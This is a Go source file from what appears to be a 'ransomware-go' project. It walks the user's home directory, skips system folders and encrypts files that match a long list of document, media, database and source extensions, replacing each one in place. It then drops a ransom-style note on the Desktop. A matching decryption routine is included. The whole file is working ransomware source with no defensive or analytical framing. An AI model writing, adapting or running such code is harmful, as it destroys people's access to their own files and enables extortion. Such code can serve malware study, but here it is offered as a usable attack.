package walker

import (
	"fmt"
	"os"
	"path/filepath"
	"github.com/Ywern1/ransomware-go/cryptofl"
	"runtime"
	"strings"
	"sync"
	"crypto/rand"
	"encoding/hex"
)

var (

	EncKey []byte

	EnFile = make(chan *cryptofl.File)
	
	// Temp Dir
	TempDir = os.TempDir()

	// Folders to skip
	SkipDirs = []string{
		"Applications",
		"Library",
		"System",
		"etc",
		"var",
		"usr", 
		"tmp",
		"sbin",
		"private",
		"bin",
	}

	// Interesting extensions to match files
	InterestingExtensions = []string{
		// Text Files
		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
		// Data files
		"csv", "pps", "ppt", "pptx",
		// Audio Files
		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
		// Video Files
		"3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
		// 3D Image files
		"3dm", "3ds", "max", "obj", "blend",
		// Raster Image Files
		"bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "ico",
		// Vector Image files
		"ai", "eps", "ps", "svg",
		// Page Layout Files
		"pdf", "indd", "pct", "epub",
		// Spreadsheet Files
		"xls", "xlr", "xlsx",
		// Database Files
		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
		// Game Files
		"dem", "gam", "nes", "rom", "sav",
		// Temp Files
		"bkp", "bak", "tmp",
		// Config files
		"cfg", "conf", "ini", "prf",
		// Source files
		"html", "php", "js", "c", "cc", "py", "lua", "go", "java",
	}

	// Workers processing the files
	NumWorkers = runtime.NumCPU()

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"
	
)

// SliceContainsSubstring check if a substring exists on a slice item
func SliceContainsSubstring(search string, slice []string) bool {
	for _, v := range slice {
		if strings.Contains(search, v) {
			return true
		}
	}
	return false
}

// Check if a value exists on slice
func StringInSlice(search string, slice []string) bool {
	for _, v := range slice {
		if v == search {
			return true
		}
	}
	return false
}

func GenerateKey() ([]byte, error) {
	Key := make([]byte, 32)
	_, err := rand.Read(Key)
	if err != nil {
		panic(err)
	}

	return Key, nil
}



func EncryptFiles() {

	HomeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(HomeDir)

	//create folder to store unencrypted files
	os.Mkdir(TempDir+"unencrypted", 0755)

	EncKey, err = GenerateKey()
	if err != nil {
		fmt.Println()
	}
	

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		
		filepath.Walk(HomeDir, func(path string, f os.FileInfo, err error) error {
			if err != nil {
				fmt.Println("Error walking path:", err)
				return err
			}
			if f.IsDir() && SliceContainsSubstring(filepath.Base(path), SkipDirs) {
				fmt.Printf("Skipping dir %s", path)
				return filepath.SkipDir
			}
			ext := strings.ToLower(filepath.Ext(path))
			fmt.Println("Found file:", path)
			// The ext must have at least the dot and the extension letter(s)
			if !f.IsDir() && len(ext) >= 2 {
				// Matching extensions
				if StringInSlice(ext[1:], InterestingExtensions) {
					
					fmt.Println("Matched:", path)
					wg.Add(1)
					EnFile <- &cryptofl.File{FileInfo: f, Extension: ext[1:], Path: path}
				}
			}

			return nil
		})
		
	}()

	for i := 0; i < NumWorkers; i++ {
		go func() {
			for file := range EnFile {
				fmt.Println("Received file:", file.Path)

				if file == nil {
					fmt.Println("Received nil file")
					continue
				}

				tempFile, err := os.OpenFile(TempDir+"unencrypted/"+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
				if err != nil {
					fmt.Println(err)
				}
				defer tempFile.Close()

				err = file.Encrypt(EncKey, tempFile)
				if err != nil {
					fmt.Println(err)
					continue
				}

				err = cryptofl.ReplaceBy(file.Path, TempDir+"unencrypted/"+file.Name())
				if err != nil {
					fmt.Println(err)
					continue
				}
				wg.Done()

			}
		}()
	}

	wg.Wait()
	close(EnFile)

	// Convert the key to a hexadecimal string
	keyStr := hex.EncodeToString(EncKey)
	fmt.Println(keyStr)
	
	val := `Hello
	Your network/system was encrypted.
	Encrypted files have new extension.
	Your encryption key is : %s
	`
	data := []byte(fmt.Sprintf(val, keyStr))
	
	//drop a note to the desktop with decryption key
	os.WriteFile(HomeDir+"/Desktop/READ_ME_TO_DECRYPT.txt", data, 0600)
}

func DecryptFiles() {

	HomeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("please enter your decryption key:")
	
	var key string
	fmt.Scanln(&key)
 
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		
		filepath.Walk(HomeDir, func(path string, f os.FileInfo, err error) error {
			if err != nil {
				fmt.Println("Error walking path:", err)
				return err
			}

			if f.IsDir() && SliceContainsSubstring(filepath.Base(path), SkipDirs) {
				fmt.Printf("Skipping dir %s", path)
				return filepath.SkipDir
			}

			ext := strings.ToLower(filepath.Ext(path))
			if ext == EncryptionExtension {

				fmt.Println("Matched:", path)
				wg.Add(1)
				EnFile <- &cryptofl.File{FileInfo: f, Extension: ext[1:], Path: path}

			}
			return nil
		})
		
	}()

	for i := 0; i < NumWorkers; i++ {
		go func() {
			for file := range EnFile {
				fmt.Println("Received file:", file.Path)
 
				if file == nil {
				   fmt.Println("Received nil file")
				   continue
				}
 
				outFile, err := os.OpenFile(file.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
				if err != nil {
				   fmt.Println(err)
				}
				defer outFile.Close()
 
				// Decrypt a single file received from the channel
				err = file.Decrypt([]byte(key), outFile)
				if err != nil {
					fmt.Println(err)
					continue
				}

				// Remove the encrypted file
				err = os.Remove(file.Path)
				if err != nil {
					fmt.Println(err)
					continue
				}

				wg.Done()
			}
		}()
	}
	wg.Wait()
	close(EnFile)
}